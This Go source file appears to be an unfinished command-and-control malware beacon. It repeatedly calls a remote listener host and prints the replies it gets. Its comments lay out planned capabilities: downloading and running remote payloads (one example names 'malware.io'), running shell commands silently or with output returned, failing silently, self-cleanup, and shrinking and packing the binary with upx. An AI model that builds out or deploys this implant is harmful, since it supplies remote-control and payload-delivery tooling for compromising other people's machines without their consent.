package main

import "time"
import "flag"
import "os"
import "net/http"
import "fmt" // TODO: Implement a pre-processor / build script which will strip out this import and all print lines (and anything that refers to DebugMode)
import "strconv"
import "io/ioutil"

const DebugMode = true

// TODO: Use ldflags instead of command line flags when compiling the binary: go build -o merlinagent.exe -ldflags "-X main.url=https://acme.com:443/" cmd/merlinagent/main.go

/**
* To build, run the following command:
*
* go build -ldflags "-w -s" simple_http_beacon.go
*
* The -w flag is used to exclude debugging information, which helps to shrink the final binary size
*
* Can also use the upx utility on Linux to pack and then unpack the binary (to make it smaller on the wire)

TODO: Figure out the cross-compilation stuff; the -s flag also helps shrink the binary size.
*/

// TODO: Move this into Serpent
/*


Beacon Action Request Format:

ACTION
DETAILS

Examples:

GET http://malware.io/new_payload.malware
EXECUTE <SHELL COMMAND>

""

Supported Actions:

* GET [URL] [file:<LOCAL DOWNLOAD LOCATION>]: Have the beacon stage a new payload (but do not run)
* RUN [url:URL | file:<LOCAL FILE LOCATION>]: Have the beacon run the specified payload (will first download the payload if a URL is provided)
* EXECUTE [SYSTEM COMMAND TO EXECUTE]: Will execute the specified system / shell command(s) and send the output back
* EXECUTE_SILENT [SYSTEM COMMAND TO EXECUTE]: Will execute the specified system / shell command(s), but will *not* send the output back
* CONFIGURE []

 */
func parse_response_body(body string) {
	
}

// TODO: Add in event handling loop for handling calls from C2 -> the beacon
func main() {
	// TODO: Catch any errors and fail silently / do self-cleanup

	dstHostPtr := flag.String("dst", "", "The IP or hostname for the remote listener host")
	dstPortPtr := flag.Int("port", 80, "Destination port; defaults to calling out to port 80")
	clientTokenPtr := flag.String("token", "", "Unique token for identifying this beacon")
	callbackInterval := flag.Int("sleep", 300, "Number of seconds the beacon should sleep before calling back (default is 300 seconds [5 minutes])")

	flag.Parse()

	if *dstHostPtr == "" || *clientTokenPtr == "" {
		if DebugMode {
			fmt.Println("\nUSAGE: simple_http_beacon -dst='<listener host>' -port=<dst port> -token='<unique ID token>' -sleep=<time between callbacks in seconds>\n")
		}
		
		os.Exit(0)
	}

	if DebugMode {
		fmt.Println("Starting beacon with sleep interval of", *callbackInterval, "...")
	}
	
	dst_url := "http://" + *dstHostPtr + ":" + strconv.Itoa(*dstPortPtr) + "/" + *clientTokenPtr

	if DebugMode {
		fmt.Println("DST URL:", dst_url)
	}

	// Go's version of a while-true loop
	for {
		if DebugMode {
			fmt.Println("Sending GET request to", dst_url)
		}
		resp, err := http.Get(dst_url)

		if err == nil {
			body, err := ioutil.ReadAll(resp.Body)

			if err == nil {
				// TODO: Handle response properly
				fmt.Println("Got response: " + string(body))
			} else if DebugMode {
				fmt.Println("ERROR:", err)
			}

			resp.Body.Close()
		} else if DebugMode {
			fmt.Println("ERROR:", err)
		}

		time.Sleep(time.Duration(*callbackInterval) * time.Second)
	}
}
